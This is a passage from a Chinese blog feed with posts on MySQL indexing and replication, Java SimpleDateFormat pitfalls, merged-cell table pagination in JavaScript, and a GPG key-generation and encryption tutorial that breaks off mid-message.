href="#InnoDB-的-B-Tree-索引" class="headerlink" title="InnoDB 的 B+ Tree 索引"></a>InnoDB 的 B+ Tree 索引</h4><p>主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。</p><img src="/images/blog8/图片4.png" /><p>辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。</p><img src="/images/blog8/图片5.png" /><h2 id="MySQL-高级特性"><a href="#MySQL-高级特性" class="headerlink" title="MySQL 高级特性"></a>MySQL 高级特性</h2><h3 id="切分"><a href="#切分" class="headerlink" title="切分"></a>切分</h3><h4 id="水平切分"><a href="#水平切分" class="headerlink" title="水平切分"></a>水平切分</h4><p>水平切分又叫 Sharding，将同一个表中的记录按行拆分到多个结构相同的表中，每个库的表结构都一样，只不过每个库表放的数据是不同的。当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓解单个数据库的压力，达到分布式的目的。</p><h4 id="垂直切分"><a href="#垂直切分" class="headerlink" title="垂直切分"></a>垂直切分</h4><p>垂直切分将一张表按列切分成多个表，因为数据库是有缓存的，你访问频率高的行字段越少，就可以在缓存里缓存更多的行，性能就越好。</p><h4 id="数据库中间件"><a href="#数据库中间件" class="headerlink" title="数据库中间件"></a>数据库中间件</h4><p>数据库中间件用来分库分表。分为客户端和代理端。</p><ul><li>客户端：分片逻辑在应用端，封装在 JAR 包中，通过修改或者封装 JDBC 层来实现。如 Sharding-JDBC。</li><li>代理端：在应用和数据中间加了一个代理层。分片逻辑统一维护在中间件服务层中。如 MyCAT。</li></ul><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><ul><li>binlog 线程：在主库上把数据更改记录到二进制日志中。</li><li>I/O 线程：备库读取二进制日志并写入到自己的中继日志中。</li><li>SQL 线程：备库读取中继日志，解析出主库已经执行的数据更改并在从备库中重放。</li></ul><h4 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h4><p>主库负责写，从库负责读，避免了同一个库读写加锁，同时也体现了高可用性。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于分享内容过多，我使用上下两篇博客的形式，本篇讲述了 MySQL。下一篇将会记录 Redis 相关的内容。</p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/05/19/blog7/</id>
        <title><![CDATA[SimpleDateFormat 类使用避坑]]></title>
        <updated>2020-08-25T07:08:49+08:00</updated>
        <link href="http://www.windboy.top/2020/05/19/blog7/"/>
        <content type="text/html" src="http://www.windboy.top/2020/05/19/blog7/"><![CDATA[<p>我在参加学校老师手下的一个项目时，负责的云存储套餐这块业务的后端开发，遇到了计算套餐开始和结束时间的问题，并使用了 SimpleDateFormat 类。SimpleDateFormat 是 Java 中使用较多的格式化日期的工具，配合 Calendar 类可以实现时间的计算。</p><h2 id="SimpleDateFormat-的使用"><a href="#SimpleDateFormat-的使用" class="headerlink" title="SimpleDateFormat 的使用"></a>SimpleDateFormat 的使用</h2><p>SimpleDateFormat 的构造方法传入想要的日期格式，parse() 将字符串转化为日期，format 则是将日期转化为字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SimpleDateFormat simpleDateFormat &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">Date date &#x3D; simpleDateFormat.parse(&quot;2020-05-19 15:06:13&quot;);    &#x2F;&#x2F; Tue May 19 15:06:13 CST 2020</span><br><span class="line">String time &#x3D; simpleDateFormat.format(date);    &#x2F;&#x2F; 2020-05-19 15:06:13</span><br></pre></td></tr></table></figure><p>注意 parse() 中当字符串和日期格式 pattern 不一样时，会抛 ParseException。ParseException 属于受检型的异常，需要在 try…catch… 代码块中捕获并进行处理 。</p><h2 id="配合-Calendar-完成日期的加减"><a href="#配合-Calendar-完成日期的加减" class="headerlink" title="配合 Calendar 完成日期的加减"></a>配合 Calendar 完成日期的加减</h2><p>Calendar 的 getInstance() 获取 Calendar 实例，setTime() 设置起始时间，add() 进行日期的加减。add() 中 Calendar.DAY_OF_MONTH 表示以天作为计算的单位，Calendar.DATE 也是相同的效果，方法的第二个参数 amount 取负数即可实现减法。如下计算下个月的日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SimpleDateFormat simpleDateFormat &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">Date date &#x3D; simpleDateFormat.parse(&quot;2020-05-19 15:06:13&quot;);</span><br><span class="line">Calendar calendar &#x3D; Calendar.getInstance();</span><br><span class="line">calendar.setTime(date);</span><br><span class="line">calendar.add(Calendar.DAY_OF_MONTH, 31);</span><br><span class="line">String endTime &#x3D; simpleDateFormat.format(calendar.getTime());    &#x2F;&#x2F; 2020-06-19 15:06:13</span><br></pre></td></tr></table></figure><h2 id="SimpleDateFormat-避坑"><a href="#SimpleDateFormat-避坑" class="headerlink" title="SimpleDateFormat 避坑"></a>SimpleDateFormat 避坑</h2><p><u>重点来惹</u>！一定要按照日期格式的标准写法，比如使用错误的日期格式 “YYYY-MM-dd” 时，format() 将会出现奇怪的日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleDateFormat simpleDateFormat &#x3D; new SimpleDateFormat(&quot;YYYY-MM-dd&quot;);</span><br><span class="line">Date date &#x3D; simpleDateFormat.parse(&quot;2020-05-19&quot;);    &#x2F;&#x2F; Sun Dec 29 00:00:00 CST 2019</span><br></pre></td></tr></table></figure><p>标准表示日期的字符和其含义：</p><table><thead><tr><th align="center">字符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">yyyy</td><td align="center">年</td></tr><tr><td align="center">MM</td><td align="center">月</td></tr><tr><td align="center">dd</td><td align="center">日</td></tr><tr><td align="center">hh</td><td align="center">12小时制</td></tr><tr><td align="center">HH</td><td align="center">24小时制</td></tr><tr><td align="center">mm</td><td align="center">分</td></tr><tr><td align="center">ss</td><td align="center">秒</td></tr><tr><td align="center">S</td><td align="center">毫秒</td></tr><tr><td align="center">E</td><td align="center">星期几</td></tr><tr><td align="center">D</td><td align="center">一年中的第几天</td></tr><tr><td align="center">F</td><td align="center">一月中的第几个星期(会把这个月总共过的天数除以7)</td></tr><tr><td align="center">w</td><td align="center">一年中的第几个星期</td></tr><tr><td align="center">W</td><td align="center">一月中的第几星期(会根据实际情况来算)</td></tr><tr><td align="center">a</td><td align="center">上下午标识</td></tr><tr><td align="center">k</td><td align="center">和HH差不多，表示24小时制</td></tr><tr><td align="center">K</td><td align="center">和hh差不多，表示12小时制</td></tr><tr><td align="center">z</td><td align="center">表示时区</td></tr></tbody></table><h2 id="SimpleDateFormat-为什么不是线程安全的？"><a href="#SimpleDateFormat-为什么不是线程安全的？" class="headerlink" title="SimpleDateFormat 为什么不是线程安全的？"></a>SimpleDateFormat 为什么不是线程安全的？</h2><p>额外拓展一个知识点，SimpleDateFormat 不是线程安全的。</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在 SimpleDateFormat 转换日期是通过 Calendar 对象来操作的，SimpleDateFormat 继承 DateFormat 类，DateFormat 类中维护一个 Calendar 对象，Calendar 实例被用来进行日期-时间计算，既被用于 format 方法也被用于 parse 方法。</p><p>在 parse 方法的最后，会调用 CalendarBuilder 的 establish 方法，入参就是 SimpleDateFormat 维护的 Calendar 实例，在 establish 方法中会调用 calendar 的 clear 方法。</p><p>SimpleDateFormat 维护的用于 format 和 parse 方法计算日期-时间的 calendar 被清空了，如果此时线程 A 将 calendar 清空且没有设置新值，线程 B 也进入 parse 方法用到了 SimpleDateFormat 对象中的 calendar 对象，此时就会产生线程安全问题。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>每一个使用 SimpleDateFormat 对象进行日期-时间进行 format 和 parse 方法的时候就创建一个新的 SimpleDateFormat 对象，用完就销毁。此时就可以使用 ThreadLocal 将 SimpleDateFormat 绑定到线程上。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SimpleDateFormat 虽小，但是有坑有拓展点，使用起来还是需要注意的。</p>]]></content>
        <author>
            <name><![CDATA[风的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/manually-table-layout-with-cell-merging.html</id>
        <title><![CDATA[当表格排版遇到了合并单元格]]></title>
        <updated>2020-06-30T16:44:00+08:00</updated>
        <link href="https://blog.rexskz.info/manually-table-layout-with-cell-merging.html"/>
        <content type="text/html" src="https://blog.rexskz.info/manually-table-layout-with-cell-merging.html"><![CDATA[<p>我负责的面单平台的需求复杂度已经越来越高了。自从寒假接了一个复杂表格排版的需求后，各类业务对于表格排版的使用场景也开始变多。毕竟，一个可以自动换页排版，并保持每一页都带有首部区域和尾部区域的表格，哪个业务不喜欢呢？（被打）</p><h1>表格的排版</h1><p>先回顾一下之前的需求：</p><ol><li>有一类专门的面单类型叫“拣货单”，用于给卖家拣货</li><li>拣货单有三个部分：头部区域（展示 Logo、买家地址等）、表格（展示商品信息）、尾部区域（展示备注和页码）</li><li>表格可能非常长，需要分页打印（纸张类型分为 A4、A5、A6 三种）</li><li>第一页的表格之前一定会有一个头部区域</li><li>每一页的表格之后都要接一个尾部区域，可以配置非第一页的表格之前是否也接一个头部区域</li><li>表格的数据内容未知，列宽、字体、字号均可以自定义，行高不确定</li></ol><p>大概的效果嘛，类似于下图（A6，横向，非第一页的表格之前也接一个头部区域）：</p><p><img src="https://static.rexskz.info/blog/article/manually-table-layout-with-cell-merging/1.png" alt="可以用来画拣货单的表格" title="可以用来画拣货单的表格"></p><p>由于这种排版方式已经超出了 Chrome 的能力，因此与后端商量了一下，决定将一些排版代码注入到生成的 HTML 面单中，然后在服务器上用 Chrome Headless 运行，将最终的结果打印为 PDF。</p><p>这种排版代码写起来还是比较开心（划掉）的，因为我跟业务之间达成了一些约定：页面的布局固定，头部区域和尾部区域可以自由发挥（加起来别超过页面高度就行），表格只能用配置的方式生成而非拖拽组件。这样我就可以一行一行来计算高度了，甚至对于后续巨大数据量的排版，我也做了一定的优化（参见 <a href="https://blog.rexskz.info/awb-tool-ultimate-optimization-for-chrome-headless.html">这篇文章</a>）。</p><h1>合并单元格</h1><p>接下来就是这个新需求了。使用代码合并单元格一直是个非常复杂的问题，不管是原生 HTML 还是各类组件库。我觉得对于我目前的能力来说，一个人短时间内写出一个支持任意合并单元格的表格（而且是在数据未知、需要手写分页的排版代码的情况下）不太现实，因此我仔细研究了一下需求，发现可以做一些合理的简化。</p><p>首先，HTML 中合并单元格的做法通常是使用 <code>&lt;table&gt;</code> 元素，如果想将一个单元格 A 与它上方的单元格 B 合并，就为 B 设置 <code>rowspan</code>，然后删掉 A，就像下面这样：</p><pre><code class="lang-html">&lt;table&gt;
    &lt;thead&gt;
        &lt;tr&gt;
            &lt;th&gt;1&lt;/th&gt;
            &lt;th&gt;2&lt;/th&gt;
            &lt;th&gt;3&lt;/th&gt;
            &lt;th&gt;4&lt;/th&gt;
        &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tbody&gt;
        &lt;tr&gt;
            &lt;td rowspan=&quot;3&quot;&gt;合并-1&lt;/td&gt;
            &lt;td&gt;拆分-2&lt;/td&gt;
            &lt;td&gt;拆分-3&lt;/td&gt;
            &lt;td rowspan=&quot;3&quot;&gt;合并-4&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;拆分-2&lt;/td&gt;
            &lt;td rowspan=&quot;2&quot;&gt;小合并-3&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;拆分-2&lt;/td&gt;
        &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;</code></pre><p>效果是这样的：</p><table>
    <thead>
        <tr>
            <th>1</th>
            <th>2</th>
            <th>3</th>
            <th>4</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td rowspan="3">合并-1</td>
            <td>拆分-2</td>
            <td>拆分-3</td>
            <td rowspan="3">合并-4</td>
        </tr>
        <tr>
            <td>拆分-2</td>
            <td rowspan="2">小合并-3</td>
        </tr>
        <tr>
            <td>拆分-2</td>
        </tr>
    </tbody>
</table><p>可以认为，<code>&lt;tbody&gt;</code> 中有三行，第一行是一个完整行，因为它有着跟表头一样完整的四列；第二行是一个非整行，它只有中间的两列，首尾两列为了跟上方的单元格合并，而被删掉了；第三行只有一列（<code>2</code>），其它三列都被合并掉了。同理，如果要跟左方的单元格合并，则需要为左方的单元格设置 <code>colspan</code> 并删掉当前的单元格。</p><p>其次，需求中描述的“合并单元格”其实长得是这样：</p><table>
    <thead>
        <tr>
            <th>分组名</th>
            <th>分组图片</th>
            <th>元素名</th>
            <th>元素属性</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td rowspan="3">组 1</td>
            <td rowspan="3">[图片 1]</td>
            <td>元素 1-1</td>
            <td>高</td>
        </tr>
        <tr>
            <td>元素 1-2</td>
            <td>中</td>
        </tr>
        <tr>
            <td>元素 1-3</td>
            <td>低</td>
        </tr>
        <tr>
            <td rowspan="3">组 2</td>
            <td rowspan="3">[图片 2]</td>
            <td>元素 2-1</td>
            <td>高</td>
        </tr>
        <tr>
            <td>元素 2-2</td>
            <td>中</td>
        </tr>
    </tbody>
</table><p>前两列是“大格”，后两列是“小格”，看起来也很工整，是不是一看就很好处理！于是经过与需求方的沟通，我们最终做了如下的约定：</p><ol><li>表格的第一条数据一定是一个完整行（毕竟第一行的单元格没有“上方元素”）</li><li>所有的非整行，缺失列的 Key 一定是完全相同的（“小格”列中的单元格不会被合并）</li><li>单元格高度不超过一页减掉头尾部区域的高度（无需考虑拆分单元格内部的内容）</li><li>不会有横向的合并操作（可以简化 <code>rowspan</code> 的计算，也无需计算 <code>colspan</code>）</li></ol><p>在这种约定下，“合并单元格”的需求被极大的简化了，变得不再那么难实现了。</p><h1>用于计算 rowspan 的简单算法</h1><p>我们与需求方约定：我们可以为表格组件设置一个“Allow empty cells merging up”的选项（默认关闭，需手动开启），如果开启，那么他们传数据过来时，所有的空字符串（<code>&quot;&quot;</code>）或缺失的字段对应的单元格将会被向上合并。对于上面那个工整的表格来说，需求方应当这样传数据：</p><pre><code class="lang-json">{
    &quot;table_data&quot;: [
        // 第一个整行
        {
            &quot;group_name&quot;: &quot;组 1&quot;,
            &quot;group_image&quot;: &quot;[图片 1]&quot;,
            &quot;item_name&quot;: &quot;元素 1-1&quot;,
            &quot;item_attr&quot;: &quot;高&quot;
        },
        {
            &quot;item_name&quot;: &quot;元素 1-2&quot;,
            &quot;item_attr&quot;: &quot;中&quot;
        },
        {
            &quot;item_name&quot;: &quot;元素 1-3&quot;,
            &quot;item_attr&quot;: &quot;低&quot;
        },
        // 第二个整行
        {
            &quot;group_name&quot;: &quot;组 2&quot;,
            &quot;group_image&quot;: &quot;[图片 2]&quot;,
            &quot;item_name&quot;: &quot;元素 2-1&quot;,
            &quot;item_attr&quot;: &quot;高&quot;
        },
        {
            &quot;item_name&quot;: &quot;元素 2-2&quot;,
            &quot;item_attr&quot;: &quot;中&quot;
        },
    ]
}</code></pre><p>虽然通过后端的渲染之后我们无法拿到原始的 JSON 数据，但可以通过对表格做一个简单的遍历来实现相同的功能：</p><pre><code class="lang-javascript">// 假设我们已经获取到了 `table`、`tbody` 等元素，并存到了同名的变量中

// 表格只有一行，无需合并
if (tbody.childElementCount &lt;= 1) {
    return;
}

// 第一行（一定是整行）没有元素，无需合并
const firstLine = tbody.firstElementChild;
if (firstLine.childElementCount &lt;= 0) {
    return;
}

// `lastTds` 用于方便的查找每一列当前的最后一个元素，便于设置 `rowspan`
const lastTds = [...firstLine.children];
// `lastRowSpans` 则是这些元素的 `rowspan` 值
const lastRowSpans = Array(firstLine.childElementCount).fill(1);

// 对于表格的每一行
for (
    let tr = firstLine.nextElementSibling;
    tr.nextElementSibling;
    tr = tr.nextElementSibling
) {
    // 枚举每一列，看是否有单元格需要被向上合并
    for (
        let td = tr.firstElementChild, i = 0, next = (td || {}).nextElementSibling;
        td;
        td = next, i++, next = (td || {}).nextElementSibling
    ) {
        if (
            // 这个单元格完全是空的，显然要被合并
            !td.firstElementChild.innerHTML
            || (
                // 目前每个单元格里面要么是纯文字，要么是一个 &lt;img&gt;，取决于该列的数据格式
                // 如果是 &lt;img&gt;，那么需求方应当传一个 URL 或者 Base64 字符串过来
                // 如果该列的数据格式配置为“图片”，且数据为空，那么后端会渲染一个 src 为空的图片
                // 所以只要出现 if 的这种情况，也可以认为这个单元格是空的，可以向上合并
                td.firstElementChild.firstElementChild
                &amp;&amp; td.firstElementChild.firstElementChild.tagName === 'IMG'
                &amp;&amp; td.firstElementChild.firstElementChild.getAttribute('src') === ''
            )
        ) {
            // 将当前列的最后一个元素（不一定是跟当前单元格紧挨着的那个单元格）的 rowspan += 1
            lastRowSpans[i]++;
            lastTds[i].setAttribute('rowspan', lastRowSpans[i]);
            // 将当前的单元格删除
            tr.removeChild(td);
        } else {
            // 如果不需要合并，那么当前列的最后一个元素就是当前单元格，并且 rowspan = 1
            lastRowSpans[i] = 1;
            td.setAttribute('data-index', i);
            lastTds[i] = td;
        }
    }
}</code></pre><h1>修改之前的分页排版算法</h1><p>如果没有分页功能的话，那么这个需求已经完成了，但是事情就是没有那么简单……</p><p>很快我就发现：如果还跟之前一样，为了不拆单元格中的内容，强制当空间不够时将下一行直接扔到下一页，势必会造成极大的空间浪费，因为有可能“大格”里面的内容并不多，但每个“大格”对应的“小格”特别多，这样一个“大格”的高度很有可能超过一页，并且这在业务上是绝对无法避免的：</p><p><img src="https://static.rexskz.info/blog/article/manually-table-layout-with-cell-merging/2.png" alt="一种无法避免的需要拆分单元格的场景" title="一种无法避免的需要拆分单元格的场景"></p><p>不过有一个值得注意的地方——业务要求的“大格”里面的内容确实不算多，一般就是一个商品名称或者图片，内容本身不会超过一页。如果我可以将这个单元格拆成有内容和没内容两部分，也能在一定程度上缓解空间浪费的问题。</p><p>之前对的排版思路是这样的：</p><ol><li>令当前高度 <code>current = headAreaHeight + thHeight</code></li><li><p>从头开始枚举每一行</p><ol><li>获取当前行的高度 <code>height = tr.offsetHeight</code></li><li><p>如果 <code>current + height + tailAreaHeight</code> 大于一页高度：</p><ol><li>在当前页的最后插入一个尾部区域</li><li>将表头和当前行放到新页，更新 <code>current</code></li></ol></li><li>否则，将当前行插入到当前页的最后，并更新 <code>current</code></li></ol></li></ol><p>需要改动的地方有两个。</p><h2>重新定义“当前行”</h2><p>如果依旧按照以前那样直接获取 <code>tr.offsetHeight</code>，可能会在这种组合场景下出现问题：</p><ul><li>当前行中有一个“大格”，高度介于一行和两行“小格”高度之间</li><li>当前页可以放下当前行，但无法放下两行“小格”的高度</li></ul><p>如果出现了这种场景，那么我是在当前页放一行“小格”还是强行放两行呢？如果是放一行，那么这个“小格”会被纵向拉伸以适应“大格”高度，不是很美观；强行放两行又可能会把尾部区域挤到下一页。</p><p>最终我决定用这样的方法：如果当前行包含“大格”，说明一定是整行，那么我先找到所有“大格”中内容高度最高的那个，假设高度为 <code>x</code>，接下来从当前行往下找非整行，根据之前的约定，在遍历到下一个整行之前，我一定能找到某个非整行，从当前行到它的所有行，加起来的高度恰好大于等于 <code>x</code>。如果是大于，说明“大格”的内容确实不多；如果是等于，说明“大格”的内容比较多，甚至会把“小格”撑开。</p><p><img src="https://static.rexskz.info/blog/article/manually-table-layout-with-cell-merging/3.png" alt="当前行高度的计算方法" title="当前行高度的计算方法"></p><p>在上图中，左边表格中的“大格”内容很少，于是我们先取红框的高度，再从上往下扫，看有多少“小格”加起来高度恰好比它高，答案是蓝框的部分，于是我们就用蓝框的高度作为当前行的高度；右边表格中的“大格”内容很多，按照这种方法蓝框会取到所有的三个“小格”，也符合预期。</p><p>如果按照这个方法计算出的“当前行高度”加上尾部区域高度已经无法放到当前页，我们就按照之前的思路，先在当前页插入一个尾部区域，然后将当前行以及蓝框中的“小格”所在的行一起放到下一页，并令 <code>current</code> 等于蓝框高度；否则，将当前行以及蓝框中的“小格”所在的行一起插入到当前页，并为 <code>current</code> 加上蓝框的高度。</p><h2>对跨页后“大格”的处理</h2><p>由于表头要在每一页的表格中展示，因此“大格”被拆分后，属于下一页的单元格必须要被显式的绘制出来。下图中的绿框就是这样一个单元格：</p><p><img src="https://static.rexskz.info/blog/article/manually-table-layout-with-cell-merging/4.png" alt="一个必须被显式绘制出来的单元格" title="一个必须被显式绘制出来的单元格"></p><p>但是还好，我们在排版时，可以记录一下“自从上一个整行过后，已经用了多少个非整行。”在上图的例子中，“内容很少”和“元素 1”是最近一个整行，然后一直到“元素 5”都是非整行（一共 4 个）。由于在计算合并单元格时，我们知道“内容很少”这一格的 <code>rowspan = 8</code>，那么可以确定绿框的 <code>rowspan = 8 - 4 - 1 = 3</code>。只要发现“元素 6”所在的行是个非整行，我们就在每个缺失的地方各插入一个 <code>rowspan = 3</code>、内容为空的“大格”，将其补充为整行。</p><p>于是，这个需求终于做完了。</p><h1>Don't Break The Web</h1><p>上文提到，我为排版代码做过一次性能优化，那么这次新增的功能是否会影响到之前的优化效果呢？答案是不会的。先来回顾一下之前我做的优化：</p><blockquote><p>只需要在一开始先将最外层元素设置为 <code>display: none</code>，这样可以避免每加载一块就渲染；然后在全部加载完之后一下子全部渲染出来。</p><p>只要能保证给每个表格设置好 <code>&lt;col&gt;</code> 的宽度，那么这一行不管被排到哪个表格块中，高度都是不变的。也就是说，所有元素的高度，在渲染之后排版之前，就已经完全确定下来了！那么我完全可以在排版的一开始，将所有必要元素的 <code>offsetHeight</code> 保存在一个 <code>Map</code> 中，之后直接调用就可以了。</p></blockquote><p>对于第一个优化，控制是否显示只会影响面单自身，与每个面单内部的元素无关。只需要保证我的合并单元格代码和排版代码可以在“一下子全部渲染出来”之后执行即可；对于第二个优化，因为将一个单元格拆到两页并不会影响总体高度，每个“大格”的内容高度也不会变，因此可以将行高与内容高度提前缓存在之前的 <code>Map</code> 中，供排版时调用。</p>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/gpg/</id>
        <title><![CDATA[GPG使用笔记]]></title>
        <updated>2020-04-02T06:47:31+08:00</updated>
        <link href="https://blog.creedowl.com/posts/gpg/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/gpg/"><![CDATA[<h2 id="why-gpg">Why GPG?</h2>
<p><a href="https://zh.wikipedia.org/wiki/GnuPG">GPG</a> 是一个密码学软件，用于加密、签名通信内容及管理非对称密码学的密钥，具体历史、介绍可以在wiki中看到，<a href="https://gnupg.org/">官网</a></p>
<p>而我使用 GPG 的缘由是，在 Github 上提交时，如果使用 GPG 对提交进行签名，会有一个<code>Verified</code>标识<del>看起来很nb</del></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585795152275.png/compress" alt="UTOOLS1585795152275.png"></p>
<p>当然使用 GPG 不仅是为了好看，它能确保你提供的信息是由你自己发布的，无法被别人篡改、冒充，前提是保护好自己的 GPG 私钥</p>
<h2 id="安装">安装</h2>
<p>这边以 MacOS 为示例进行操作</p>
<p><strong>强烈建议 MacOS 用户使用 <a href="https://gpgtools.org/">GPG Suite</a> 进行操作，可以避免一些奇奇怪怪的问题</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div><p><del>仅安装 GPG 本体</del></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># deprecated</span>
brew install gpg
</code></pre></div><h2 id="生成密钥">生成密钥</h2>
<p>GPG 采用非对称加密，一切的操作都需要有密钥。网上一些教程中的操作与我使用的 GPG 版本 <code>gpg (GnuPG/MacGPG2) 2.2.17</code> 有点出入，以下操作都在我所使用的版本下进行</p>
<p>有两个命令用于生成密钥，为<code>gpg --gen-key</code>和<code>gpg --full-gen-key</code>，区别是前者采用默认的配置不可更改，后者能自定义配置。我们采用后一种，首先选择密钥类型，默认的<code>1</code>就可以了</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ gpg --full-gen-key
gpg <span class="o">(</span>GnuPG/MacGPG2<span class="o">)</span> 2.2.17<span class="p">;</span> Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

请选择您要使用的密钥类型：
   <span class="o">(</span>1<span class="o">)</span> RSA 和 RSA （默认）
   <span class="o">(</span>2<span class="o">)</span> DSA 和 Elgamal
   <span class="o">(</span>3<span class="o">)</span> DSA（仅用于签名）
   <span class="o">(</span>4<span class="o">)</span> RSA（仅用于签名）
您的选择是？ <span class="m">1</span>
</code></pre></div><p>接着选择密钥长度，默认<code>2048</code>即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">RSA 密钥的长度应在 1024 位与 4096 位之间。
您想要使用的密钥长度？(2048) 2048
</code></pre></div><p>然后设定密钥的有效期限，我们没有特殊需求，设置永不过期即可</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">请设定这个密钥的有效期限。
         0 = 密钥永不过期
      &lt;n&gt;  = 密钥在 n 天后过期
      &lt;n&gt;w = 密钥在 n 周后过期
      &lt;n&gt;m = 密钥在 n 月后过期
      &lt;n&gt;y = 密钥在 n 年后过期
密钥的有效期限是？(0) 0
</code></pre></div><p>确认上述设置后，依次输入姓名、邮箱和注释，这里我使用随机信息用于演示</p>
<pre><code>GnuPG 需要构建用户标识以辨认您的密钥。

真实姓名： naive
电子邮件地址： naive@test.com
注释： too young too simple
您选定了此用户标识：
    “naive (too young too simple) &lt;naive@test.com&gt;”

更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？
</code></pre>
<p>确定后，需要设定密钥的密码，如果你采用了 <code>GPG Suite</code> ，会出现一个窗口，在此输入密码</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1585796741624.png/compress" alt="UTOOLS1585796741624.png"></p>
<p>如果没使用<code>GPG Suite</code>，则会在你当前终端弹出一个全屏终端窗口，同样是输入密码。</p>
<blockquote>
<p>注意，在 mac 终端环境下，如果语言是中文的话，这个终端窗口可能会乱码，但不影响使用，也可以临时设置语言为英文解决这个问题<code>LANGUAGE=en gpg --full-generate-key</code>。但千万不要用<code>ctrl-c</code>结束这个进程，这会破坏当前终端环境，后面的输入会变得很奇怪，而且后台进程不会结束，会占满你的CPU</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘
、移动鼠标、读写硬盘之类的）将会是一个不错的主意；这会让随机数
发生器有更好的机会获得足够的熵。
gpg: 密钥 4C26D2E451FFDAF1 被标记为绝对信任
gpg: 目录‘/Users/creedowl/.gnupg/openpgp-revocs.d’已创建
gpg: 吊销证书已被存储为‘/Users/creedowl/.gnupg/openpgp-revocs.d/0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1.rev’
公钥和私钥已经生成并被签名。

pub   rsa2048 2020-04-02 [SC]
      0B3C52F1EF07B14EA7C45C9A4C26D2E451FFDAF1
uid                      naive (too young too simple) &lt;naive@test.com&gt;
sub   rsa2048 2020-04-02 [E]
</code></pre></div><p>这样，密钥就生成完成，其中<code>4C26D2E451FFDAF1</code>就是你的密钥名，后续操作都需要通过这个密钥名选择密钥，但也可以通过之前设置的姓名或邮箱代替操作</p>
<h2 id="gpg-常用操作">GPG 常用操作</h2>
<p>GPG 最基础的操作就是对文件等信息进行加密、签名，首先创建一个测试文件<code>test.txt</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="nb">test</span> &gt; test.txt
</code></pre></div><h3 id="加密">加密</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --recipient creedowl --output test.txt.gpg --encrypt test.txt
</code></pre></div><p>其中<code>--recipient</code>指定接收者，简写为<code>-r</code>，设定接受者时需要你本地有接收者的<strong>公钥</strong>，可以用密钥名、姓名或者邮箱进行指定。<code>--output</code>指定输出文件名，可省略。<code>--encrypt</code>指定待加密的文件，简写为<code>-e</code>。这样在你当前目录下会生成一个<code>test.txt.gpg</code>即加密后的文件，你就可以把这个文件发送给接受者，不必担心文件内容被第三方读取</p>
<p><strong>注意</strong>这里生成加密文件为二进制格式，有时候（如通过邮件发送）不便于操作，可以加上<code>--armor</code>参数（简写为<code>-a</code>）生成文本格式的密文，如</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -r creedowl -ae test.txt
</code></pre></div><p>生成的加密文件为<code>test.txt.asc</code></p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP MESSAGE-----

hQEMA9KmvDhAMTGrAQf+KITqx4HTpWsevIEfRFlw5g+jt8l8ol3fuww0gBoMEPBG
KaqxCmjIpHZdGmaXwBSKadmeieZGLsm1CYuf4gbv4FpdWgveVWnLvB/HmwuvnmJt
